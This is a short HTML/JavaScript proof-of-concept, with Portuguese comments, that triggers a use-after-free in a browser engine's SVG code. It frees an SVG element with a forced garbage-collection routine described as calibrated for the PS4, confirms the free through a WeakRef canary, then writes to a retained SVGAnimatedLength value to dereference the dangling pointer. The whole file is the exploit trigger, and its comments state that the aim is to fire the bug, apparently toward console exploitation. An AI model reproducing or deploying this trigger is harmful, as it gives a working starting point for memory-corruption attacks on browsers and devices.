<script>
    function gc() {
    if (typeof GCController !== "undefined")
        GCController.collect();
    else {
        var gcRec = function (n) {
            if (n < 1)
                return {};
            var temp = {i: "ab" + i + (i / 100000)};
            temp += "foo";
            gcRec(n-1);
        };
        for (var i = 0; i < 1000; i++)
            gcRec(10);
    }
  }
  
onload = async () => {
    let svg0 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    let svgAnimatedLength = svg0.width;
    let baseVal = svgAnimatedLength.baseVal;
    let clipPath0 = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
    svg0.append(clipPath0);
    clipPath0.append('');
    await undefined;

    // Canário antes de nular
    let canary = new WeakRef(svg0);

    svg0 = null;
    svgAnimatedLength = null;
    clipPath0 = null;

    // GC calibrado pro PS4
    await gc(); // ou o export do seu force-gc-ps4.js

    // Diagnóstico: svg0 foi coletado?
    if (canary.deref() !== undefined) {
        document.body.innerHTML =
            'FALHOU: svg0 NÃO foi coletado — m_contextElement ainda válido, UAF impossível.<br>' +
            'Causa: referência adicional mantendo SVGSVGElement vivo.';
        return;
    }

    // svg0 coletado → m_contextElement é raw pointer dangling
    // baseVal ainda mantém SVGAnimatedLength vivo via RefPtr
    document.body.innerHTML = 'svg0 coletado. Disparando UAF...';
    baseVal.value = 0; // commitPropertyChange → m_contextElement->... → UAF
    document.body.innerHTML = 'PASS if no crash';
};
</script>
